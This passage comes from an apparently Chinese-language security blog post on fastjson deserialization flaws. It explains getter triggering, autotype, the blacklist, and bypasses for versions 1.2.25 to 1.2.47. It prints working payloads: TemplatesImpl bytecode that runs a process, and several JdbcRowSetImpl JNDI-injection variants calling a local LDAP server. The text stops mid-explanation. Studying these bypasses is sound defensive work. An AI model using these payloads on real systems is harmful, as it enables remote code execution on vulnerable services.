+</code></pre></div><br />
+即满足以下几个条件:<br />
+- 对应成员变量继承自Collection/AtomicBoolean/AtomicInteger/AtomicLong<br />
+- 对应成员变量没有setter方法<br />
+- get开头且第四个字母大写<br />
+- 为非静态方法，无参数传入<br />
+- 对应的成员变量为私有变量(如果是公有变量则会直接赋值)</p>
+<h3 id="一些其他注意事项">一些其他注意事项<a class="headerlink" href="#一些其他注意事项" title="Permanent link">#</a></h3>
+<p>上面的示例代码中有一个比较奇怪的地方，我们是直接构造了一个字符串去反序列化，而且该字符串中还包含了<code>@type</code>这个项，如果我们直接用<code>toJSONString()</code>的字符串去反序列化，结果是不是不一样呢？代码最终的输出结果如下:<br />
+<div class="highlight"><pre><span></span><code>call constructor
+-------toJSONString()------
+call get id
+call get name
+call get t1
+{&quot;id&quot;:5,&quot;name&quot;:&quot;tom&quot;,&quot;t1&quot;:{}}
+-------parse(str)------
+{&quot;name&quot;:&quot;tom&quot;,&quot;id&quot;:5,&quot;t1&quot;:{}}
+-------parseObject(str)------
+{&quot;name&quot;:&quot;tom&quot;,&quot;id&quot;:5,&quot;t1&quot;:{}}
+-------parseObject(str, User.class)------
+call default constructor
+call set id
+call set name
+call get t1
+User{id=5, name=&#39;tom&#39;, t1=null}
+</code></pre></div><br />
+可以看到<code>parse(str)</code>和<code>parseObject(str)</code>不再调用getter和setter方法，而是返回了一个JSONObject类型，并没有将类型转换为User类型，而<code>parseObject(str, User.class)</code>则实现了类型转换，依然调用了setter方法和某些getter方法。</p>
+<p>所以我们为了能够触发getter和setter方法，需要使用到@type这个项，@type是fastjson中特有的项，用于标注这个对象的类型，当fastjson将其反序列化时会将该对象进行自动类型转换，这也是fastjson反序列化的罪魁祸首，我们称之为autotype。</p>
+<h2 id="fastjson反序列化_1">fastjson反序列化<a class="headerlink" href="#fastjson反序列化_1" title="Permanent link">#</a></h2>
+<h3 id="可利用的类">可利用的类<a class="headerlink" href="#可利用的类" title="Permanent link">#</a></h3>
+<h4 id="templatesimpl">TemplatesImpl<a class="headerlink" href="#templatesimpl" title="Permanent link">#</a></h4>
+<p>这个是我们的老朋友了，可以在之前的文章或网上的文章中找到关于它的介绍。我们知道，只要能够调用到<code>TemplatesImpl.getOutputProperties()</code>方法，最终能够实现任意代码执行。结合前面的分析，我们想要触发getter方法，需要满足一定的条件，我们先来看看这个方法是否满足条件:<br />
+<div class="highlight"><pre><span></span><code><span class="c1">// 对应的成员变量</span>
+<span class="kd">private</span> <span class="n">Properties</span> <span class="n">_outputProperties</span><span class="p">;</span>
+
+<span class="c1">// getter方法</span>
+<span class="kd">public</span> <span class="kd">synchronized</span> <span class="n">Properties</span> <span class="nf">getOutputProperties</span><span class="p">()</span> <span class="p">{</span>
+        <span class="k">try</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="n">newTransformer</span><span class="p">().</span><span class="na">getOutputProperties</span><span class="p">();</span>
+        <span class="p">}</span>
+        <span class="k">catch</span> <span class="p">(</span><span class="n">TransformerConfigurationException</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="kc">null</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+</code></pre></div><br />
+可以看到这个成员变量完美地满足了我们的条件，但是这里存在疑惑: <code>_outputProperties</code>能够和<code>getOutputProperties()</code>方法对应吗？(多了一个下划线)</p>
+<h5 id="smartmatch">smartMatch<a class="headerlink" href="#smartmatch" title="Permanent link">#</a></h5>
+<p>fastjson反序列化时，在<code>JavaBeanDeserializer.parseField()</code>方法中使用了<code>smartMatch()</code>这个方法来寻找对应的成员变量:<br />
+<div class="highlight"><pre><span></span><code><span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">parseField</span><span class="p">(</span><span class="n">DefaultJSONParser</span> <span class="n">parser</span><span class="p">,</span> <span class="n">String</span> <span class="n">key</span><span class="p">,</span> <span class="n">Object</span> <span class="n">object</span><span class="p">,</span> <span class="n">Type</span> <span class="n">objectType</span><span class="p">,</span>
+                              <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">fieldValues</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">JSONLexer</span> <span class="n">lexer</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="na">lexer</span><span class="p">;</span>
+        <span class="n">FieldDeserializer</span> <span class="n">fieldDeserializer</span> <span class="o">=</span> <span class="n">smartMatch</span><span class="p">(</span><span class="n">key</span><span class="p">);</span>
+        <span class="c1">//...</span>
+        <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
+    <span class="p">}</span>
+
+<span class="kd">public</span> <span class="n">FieldDeserializer</span> <span class="nf">smartMatch</span><span class="p">(</span><span class="n">String</span> <span class="n">key</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// ...</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">fieldDeserializer</span> <span class="o">==</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
+     <span class="n">snakeOrkebab</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>  
+     <span class="n">String</span> <span class="n">key2</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>  
+
+     <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">key</span><span class="p">.</span><span class="na">length</span><span class="p">();</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>  
+     <span class="kt">char</span> <span class="n">ch</span> <span class="o">=</span> <span class="n">key</span><span class="p">.</span><span class="na">charAt</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>  
+     <span class="k">if</span> <span class="p">(</span><span class="n">ch</span> <span class="o">==</span> <span class="sc">&#39;_&#39;</span><span class="p">)</span> <span class="p">{</span>  
+     <span class="n">snakeOrkebab</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>  
+     <span class="n">key2</span> <span class="o">=</span> <span class="n">key</span><span class="p">.</span><span class="na">replaceAll</span><span class="p">(</span><span class="s">&quot;_&quot;</span><span class="p">,</span> <span class="s">&quot;&quot;</span><span class="p">);</span>  
+     <span class="k">break</span><span class="p">;</span>  
+     <span class="p">}</span>  
+     <span class="k">if</span> <span class="p">(</span><span class="n">ch</span> <span class="o">==</span> <span class="sc">&#39;-&#39;</span><span class="p">)</span> <span class="p">{</span>  
+     <span class="n">snakeOrkebab</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>  
+     <span class="n">key2</span> <span class="o">=</span> <span class="n">key</span><span class="p">.</span><span class="na">replaceAll</span><span class="p">(</span><span class="s">&quot;-&quot;</span><span class="p">,</span> <span class="s">&quot;&quot;</span><span class="p">);</span>  
+     <span class="k">break</span><span class="p">;</span>  
+     <span class="p">}</span> 
+    <span class="p">}</span>
+    <span class="c1">// ...</span>
+<span class="p">}</span>
+</code></pre></div><br />
+可以看到其会将成员变量中的<code>-</code>,<code>_</code>忽略掉，从而使得<code>_outputProperties</code>能够和<code>getOutputProperties()</code>方法对应。</p>
+<h5 id="payload">payload<a class="headerlink" href="#payload" title="Permanent link">#</a></h5>
+<p><div class="highlight"><pre><span></span><code><span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="nt">&quot;@type&quot;</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">  </span><span class="nt">&quot;_bytecodes&quot;</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;yv66vgAAADMAHAEAA0NhdAcAFgEAEGphdmEvbGFuZy9PYmplY3QHAAMBAApTb3VyY2VGaWxlAQAIQ2F0LmphdmEBAAg8Y2xpbml0PgEAAygpVgEABENvZGUBABFqYXZhL2xhbmcvUnVudGltZQcACgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMAAwADQoACwAOAQALbm90ZXBhZC5leGUIABABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAASABMKAAsAFAEAFkV2aWxDYXQ2NTM4ODI3MzI3MTQxMDABAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwAXAQAGPGluaXQ+DAAZAAgKABgAGgAhAAIAGAAAAAAAAgAIAAcACAABAAkAAAAWAAIAAAAAAAq4AA8SEbYAFVexAAAAAAABABkACAABAAkAAAARAAEAAQAAAAUqtwAbsQAAAAAAAQAFAAAAAgAG&quot;</span><span class="p">],</span><span class="w"></span>
+<span class="w">  </span><span class="nt">&quot;_name&quot;</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;a&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">  </span><span class="nt">&quot;_tfactory&quot;</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">{},</span><span class="w"></span>
+<span class="w">  </span><span class="nt">&quot;outputProperties&quot;</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">{}</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div><br />
+这里有几个注意事项:<br />
+1. <code>_bytecodes</code>中将字节码使用base64编码，这是因为fastjson会对byte类型的字段进行base64解码的缘故，这也方便了我们构造payload<br />
+2. <code>_bytecode</code>中的字节码是一个构造好的class类，其static块中存在恶意代码，反编译后大致如下:<br />
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class="p">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">EvilCat653882732714100</span> <span class="kd">extends</span> <span class="n">AbstractTranslet</span> <span class="p">{</span>
+    <span class="kd">static</span> <span class="p">{</span>
+        <span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="s">&quot;notepad.exe&quot;</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="kd">public</span> <span class="nf">EvilCat653882732714100</span><span class="p">()</span> <span class="p">{</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div><br />
+4. <strong>这个类只能在开启SupportNonPublicField特性的fastjson反序列化中使用，因为<code>_bytecodes</code>,<code>_tfactory</code>等属性都没有对应的setter</strong><br />
+5. <code>_tfactory</code>设置为<code>{}</code>，这样fastjson会生成一个空对象，可以解决某些jdk版本中<code>defineTransletClasses()</code>用到会引用<code>_tfactory</code>属性导致异常退出的问题</p>
+<h4 id="jdbcrowsetimpl">JdbcRowSetImpl<a class="headerlink" href="#jdbcrowsetimpl" title="Permanent link">#</a></h4>
+<p>这个类的关键在于其的<code>setAutoCommit()</code>方法，最终会发出一个<code>context.lookup(datasourceName)</code>请求实现JNDI注入。</p>
+<h5 id="payload_1">payload<a class="headerlink" href="#payload_1" title="Permanent link">#</a></h5>
+<div class="highlight"><pre><span></span><code><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">    </span><span class="nt">&quot;dataSourceName&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;ldap://127.0.0.1:1389/Basic/Command/calc.exe&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">    </span><span class="nt">&quot;autoCommit&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div>
+<h3 id="安全机制与bypass">安全机制与bypass<a class="headerlink" href="#安全机制与bypass" title="Permanent link">#</a></h3>
+<h4 id="1225">1.2.25<a class="headerlink" href="#1225" title="Permanent link">#</a></h4>
+<p>在fastjson 1.2.25中为了解决反序列化问题，加入了黑名单机制和一个安全开关: <code>autotypesupport</code>(默认值为false)。如果我们在&gt;=1.2.25版本中再使用上述的payload会报错:<code>autoType is not support.</code>，这是由于我们使用的类加入了黑名单的缘故。</p>
+<p>根据报错，我们在<code>ParserConfig.checkAutoType()</code>中找到了黑名单。整个黑名单如下，只要我们使用的类是以这些开头，就会被黑名单拦截。<br />
+<div class="highlight"><pre><span></span><code>bsh
+com.mchange
+com.sun.
+java.lang.Thread
+java.net.Socket
+java.rmi
+javax.xml
+org.apache.bcel
+org.apache.commons.beanutils
+org.apache.commons.collections.Transformer
+org.apache.commons.collections.functors
+org.apache.commons.collections4.comparators
+org.apache.commons.fileupload
+org.apache.myfaces.context.servlet
+org.apache.tomcat
+org.apache.wicket.util
+org.codehaus.groovy.runtime
+org.hibernate
+org.jboss
+org.mozilla.javascript
+org.python.core
+org.springframework
+</code></pre></div></p>
+<p>然后我们再看看autotypesupport的作用是什么，通过分析<code>ParserConfig.checkAutoType()</code>可以知道根据类名寻找对应的类的步骤大致如下(<strong>fastjson1.2.25，不同版本的步骤有可能有差异</strong>):</p>
+<ol>
+<li>如果开启了autotypesupport 或者expectClass不为空时则按白黑名单寻找类(具体步骤看下方)</li>
+<li><code>TypeUtils.getClassFromMapping(typeName)</code> :尝试从缓存Map中寻找类</li>
+<li><code>this.deserializers.findClass(typeName)</code>: 尝试从deserializers中寻找类，其中buckets中存放了一些java的基础类</li>
+<li>如果上述找到了类，则直接返回</li>
+<li>如果未开启autotypesupport则黑白名单寻找类(具体步骤看下方)</li>
+<li>expectClass校验和注解校验，如果通过则返回</li>
+<li>如果上述找到了类，则返回</li>
+<li>未开启 autoTypeSupport 则抛出异常(拦截)</li>
+</ol>
+<h5 id="未开启autotypesupport">未开启autotypesupport<a class="headerlink" href="#未开启autotypesupport" title="Permanent link">#</a></h5>
+<p>当未开启autotyesupport时，会有以下的步骤:<br />
+1. 判断typename是否在黑名单中(以黑名单中的类名开头)，如果是则直接拦截<br />
+2. 判断typename是否在白名单中(默认为空)，如果是则根据类名寻找类</p>
+<p>可以看到是先进行了一个黑名单的过滤，再从白名单中寻找允许的类。</p>
+<h5 id="开启autotypesupport">开启autotypesupport<a class="headerlink" href="#开启autotypesupport" title="Permanent link">#</a></h5>
+<p>当开启autotypesupport时，会有以下的步骤:<br />
+1. 判断typename是否在在白名单中，如果是则直接根据类名寻找类并返回<br />
+2. 判断typename是否在黑名单中(以黑名单中的类名开头)，如果是则直接拦截<br />
+3. <code>TypeUtils.loadClass(typeName, this.defaultClassLoader)</code>: 调用这个方法去寻找类并返回</p>
+<p>注意这里的白名单和我们理解上的白名单存在出入，在白名单中的内容直接通过，但是不在白名单中的内容不一定不通过(因为存在步骤3的缘故)。</p>
+<p>可以看到开启了autotypesupport后，依然使用了黑白名单，只是顺序颠倒了。同时假如typename通过了黑白名单，我们还可以通过<code>TypeUtils.loadClass(typeName, this.defaultClassLoader);</code>来寻找类，这也是我们后面介绍的绕过方法之一。</p>
+<h5 id="1225-1241-bypass">1.2.25-1.2.41 bypass<a class="headerlink" href="#1225-1241-bypass" title="Permanent link">#</a></h5>
+<p>根据上述的步骤我们发现在typename通过了黑白名单后，会通过<code>TypeUtils.loadClass(typeName, this.defaultClassLoader);</code>来寻找类，通过分析这个方法，其步骤如下:<br />
+1. <code>mappings.get(className)</code>从一个缓存的mapping中寻找类<br />
+2. 如果className以<code>[</code>开头，则去除这个开头并通过递归调用当前函数寻找类<br />
+3. 如果className以<code>L</code>开头，<code>;</code>结尾，则去除这个开头结尾并通过递归调用当前函数寻找类<br />
+4. 使用传入的<code>classLoader</code>寻找类<br />
+5. 使用当前线程的<code>contextClassLoader</code>寻找类<br />
+6. 使用<code>Class.forName</code>寻找类</p>
+<p>从以上步骤我们就发现了可以绕过黑白名单并能成功加载类的方法:<br />
+1. 类名使用<code>L</code>开头，<code>;</code>结尾<br />
+2. 类名使用<code>[</code><br />
+顺便一提fastjson为什么要处理这些奇怪的字符，实际上它们是JNI的字段描述符，以<code>L</code>开头;<code>;</code>结尾代表的是java中的Object，以<code>[</code>开头代表的是数组。</p>
+<p>所以我们最终的绕过payload为:<br />
+<div class="highlight"><pre><span></span><code><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">    </span><span class="nt">&quot;dataSourceName&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;ldap://127.0.0.1:1389/Basic/Command/calc.exe&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">    </span><span class="nt">&quot;autoCommit&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div><br />
+或者<br />
+<div class="highlight"><pre><span></span><code><span class="p">{</span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="s2">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="p">[{</span><span class="nt">&quot;dataSourceName&quot;</span><span class="p">:</span><span class="s2">&quot;ldap://127.0.0.1:1389/Basic/Command/calc.exe&quot;</span><span class="p">,</span><span class="nt">&quot;autoCommit&quot;</span><span class="p">:</span><span class="kc">true</span><span class="p">}]}</span><span class="w"></span>
+</code></pre></div><br />
+注意第二个绕过的payload并不是一个合法的json格式，但是fastjson能够成功解析</p>
+<h4 id="1242">1.2.42<a class="headerlink" href="#1242" title="Permanent link">#</a></h4>
+<p>这个版本主要的安全改动是将黑名单改为hash，同时使用hash去处理了 <code>L</code> <code>[</code> <code>;</code>字符，去除头尾的 <code>L</code> <code>[</code> <code>;</code>:<br />
+<div class="highlight"><pre><span></span><code><span class="k">this</span><span class="p">.</span><span class="na">denyHashCodes</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">long</span><span class="o">[]</span><span class="p">{</span><span class="o">-</span><span class="mi">8720046426850100497L</span><span class="p">,</span> <span class="o">-</span><span class="mi">8109300701639721088L</span><span class="p">,</span> <span class="o">-</span><span class="mi">7966123100503199569L</span><span class="p">,</span> <span class="o">-</span><span class="mi">7766605818834748097L</span><span class="p">,</span> <span class="o">-</span><span class="mi">6835437086156813536L</span><span class="p">,</span> <span class="o">-</span><span class="mi">4837536971810737970L</span><span class="p">,</span> <span class="o">-</span><span class="mi">4082057040235125754L</span><span class="p">,</span> <span class="o">-</span><span class="mi">2364987994247679115L</span><span class="p">,</span> <span class="o">-</span><span class="mi">1872417015366588117L</span><span class="p">,</span> <span class="o">-</span><span class="mi">254670111376247151L</span><span class="p">,</span> <span class="o">-</span><span class="mi">190281065685395680L</span><span class="p">,</span> <span class="mi">33238344207745342L</span><span class="p">,</span> <span class="mi">313864100207897507L</span><span class="p">,</span> <span class="mi">1203232727967308606L</span><span class="p">,</span> <span class="mi">1502845958873959152L</span><span class="p">,</span> <span class="mi">3547627781654598988L</span><span class="p">,</span> <span class="mi">3730752432285826863L</span><span class="p">,</span> <span class="mi">3794316665763266033L</span><span class="p">,</span> <span class="mi">4147696707147271408L</span><span class="p">,</span> <span class="mi">5347909877633654828L</span><span class="p">,</span> <span class="mi">5450448828334921485L</span><span class="p">,</span> <span class="mi">5751393439502795295L</span><span class="p">,</span> <span class="mi">5944107969236155580L</span><span class="p">,</span> <span class="mi">6742705432718011780L</span><span class="p">,</span> <span class="mi">7179336928365889465L</span><span class="p">,</span> <span class="mi">7442624256860549330L</span><span class="p">,</span> <span class="mi">8838294710098435315L</span><span class="p">};</span>
+<span class="c1">// ...</span>
+<span class="k">if</span> <span class="p">(((</span><span class="o">-</span><span class="mi">3750763034362895579L</span> <span class="o">^</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">className</span><span class="p">.</span><span class="na">charAt</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span> <span class="o">*</span> <span class="mi">1099511628211L</span> <span class="o">^</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">className</span><span class="p">.</span><span class="na">charAt</span><span class="p">(</span><span class="n">className</span><span class="p">.</span><span class="na">length</span><span class="p">()</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span> <span class="o">*</span> <span class="mi">1099511628211L</span> <span class="o">==</span> <span class="mi">655701488918567152L</span><span class="p">)</span> <span class="p">{</span>
+                <span class="n">className</span> <span class="o">=</span> <span class="n">className</span><span class="p">.</span><span class="na">substring</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">className</span><span class="p">.</span><span class="na">length</span><span class="p">()</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></p>
+<h5 id="1225-1242-bypass">1.2.25-1.2.42 bypass<a class="headerlink" href="#1225-1242-bypass" title="Permanent link">#</a></h5>
+<p>这里的处理只是处理了一次，所以存在经典的双写绕过，即双写<code>L</code> <code>;</code>。所以我们最终的绕过payload为:<br />
+<div class="highlight"><pre><span></span><code><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">    </span><span class="nt">&quot;dataSourceName&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;ldap://127.0.0.1:1389/Basic/Command/calc.exe&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">    </span><span class="nt">&quot;autoCommit&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div></p>
+<h4 id="1243">1.2.43<a class="headerlink" href="#1243" title="Permanent link">#</a></h4>
+<p>这个版本的fastjson判断只要以LL开头就直接抛出异常:<br />
+<div class="highlight"><pre><span></span><code><span class="k">if</span> <span class="p">(((</span><span class="o">-</span><span class="mi">3750763034362895579L</span> <span class="o">^</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">className</span><span class="p">.</span><span class="na">charAt</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span> <span class="o">*</span> <span class="mi">1099511628211L</span> <span class="o">^</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">className</span><span class="p">.</span><span class="na">charAt</span><span class="p">(</span><span class="n">className</span><span class="p">.</span><span class="na">length</span><span class="p">()</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span> <span class="o">*</span> <span class="mi">1099511628211L</span> <span class="o">==</span> <span class="mi">655701488918567152L</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">if</span> <span class="p">(((</span><span class="o">-</span><span class="mi">3750763034362895579L</span> <span class="o">^</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">className</span><span class="p">.</span><span class="na">charAt</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span> <span class="o">*</span> <span class="mi">1099511628211L</span> <span class="o">^</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">className</span><span class="p">.</span><span class="na">charAt</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span> <span class="o">*</span> <span class="mi">1099511628211L</span> <span class="o">==</span> <span class="mi">655656408941810501L</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="k">throw</span> <span class="k">new</span> <span class="n">JSONException</span><span class="p">(</span><span class="s">&quot;autoType is not support. &quot;</span> <span class="o">+</span> <span class="n">typeName</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></p>
+<h5 id="1225-1243-bypass">1.2.25-1.2.43 bypass<a class="headerlink" href="#1225-1243-bypass" title="Permanent link">#</a></h5>
+<p>实际上我们依然能够使用数组的方式(以<code>[</code>开头)进行绕过，所以我们上面的绕过payload依然可行:<br />
+<div class="highlight"><pre><span></span><code><span class="p">{</span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="s2">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="p">[{</span><span class="nt">&quot;dataSourceName&quot;</span><span class="p">:</span><span class="s2">&quot;ldap://127.0.0.1:1389/Basic/Command/calc.exe&quot;</span><span class="p">,</span><span class="nt">&quot;autoCommit&quot;</span><span class="p">:</span><span class="kc">true</span><span class="p">}]}</span><span class="w"></span>
+</code></pre></div></p>
+<h4 id="1244">1.2.44<a class="headerlink" href="#1244" title="Permanent link">#</a></h4>
+<p>这个版本的fastjson判断只要以<code>[</code>开头就抛出异常，以<code>;</code>结尾也抛出异常，因此我们上述的绕过方法都失效了:<br />
+<div class="highlight"><pre><span></span><code><span class="kt">long</span> <span class="n">h1</span> <span class="o">=</span> <span class="p">(</span><span class="o">-</span><span class="mi">3750763034362895579L</span> <span class="o">^</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">className</span><span class="p">.</span><span class="na">charAt</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span> <span class="o">*</span> <span class="mi">1099511628211L</span><span class="p">;</span>
+<span class="k">if</span> <span class="p">(</span><span class="n">h1</span> <span class="o">==</span> <span class="o">-</span><span class="mi">5808493101479473382L</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">throw</span> <span class="k">new</span> <span class="n">JSONException</span><span class="p">(</span><span class="s">&quot;autoType is not support. &quot;</span> <span class="o">+</span> <span class="n">typeName</span><span class="p">);</span>
+<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">((</span><span class="n">h1</span> <span class="o">^</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">className</span><span class="p">.</span><span class="na">charAt</span><span class="p">(</span><span class="n">className</span><span class="p">.</span><span class="na">length</span><span class="p">()</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span> <span class="o">*</span> <span class="mi">1099511628211L</span> <span class="o">==</span> <span class="mi">655701488918567152L</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">throw</span> <span class="k">new</span> <span class="n">JSONException</span><span class="p">(</span><span class="s">&quot;autoType is not support. &quot;</span> <span class="o">+</span> <span class="n">typeName</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></p>
+<h5 id="1225-1244-bypass">1.2.25-1.2.44 bypass<a class="headerlink" href="#1225-1244-bypass" title="Permanent link">#</a></h5>
+<p>这个bypass主要是用到的一个黑名单外的类，其是mybatis包里的类，所以需要有mybatis的依赖:<br />
+<div class="highlight"><pre><span></span><code><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">    </span><span class="nt">&quot;properties&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;data_source&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;ldap://127.0.0.1:23457/Command8&quot;</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div></p>
+<h4 id="1244-1247">1.2.44-1.2.47<a class="headerlink" href="#1244-1247" title="Permanent link">#</a></h4>
+<p>增加了黑名单，同时截止到1.2.47版本，fastjson存在一个危害比较大的反序列化绕过方式，即上面提到的缓存机制。</p>
+<h5 id="1247-bypass">&lt;=1.2.47 bypass<a class="headerlink" href="#1247-bypass" title="Permanent link">#</a></h5>
+<p>我们上面提到假如fastjson从缓存的mapping中找到类后会直接返回，那么有没有一种方式可以使得一个类缓存呢？我们先看看最终的payload:<br />
+<div class="highlight"><pre><span></span><code><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="nt">&quot;payload1&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;java.lang.Class&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;val&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="w"></span>
+<span class="w">    </span><span class="p">},</span><span class="w"></span>
+<span class="w">    </span><span class="nt">&quot;payload2&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;dataSourceName&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;ldap://localhost:1389/Object&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;autoCommit&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div><br />
+可以看到这个payload中使用到了2次@type，并且在第一个@type中指定了类型为<code>java.lang.Class</code>这个看起来比较特殊的类，并且存在val字段为<code>com.sun.rowset.JdbcRowSetImpl</code>，第二段中则是我们的原始payload。<br />
+我们通过调试来理解这个payload，当fastjson在处理第一个@type时，会在<code>this.deserializers.findClass(typeName)</code>找到Class这个类，然后这个类会被返回，在上层经过一些赋值，最终会使用MiscCodec这个deserializer来对这个类进行解析:<br />
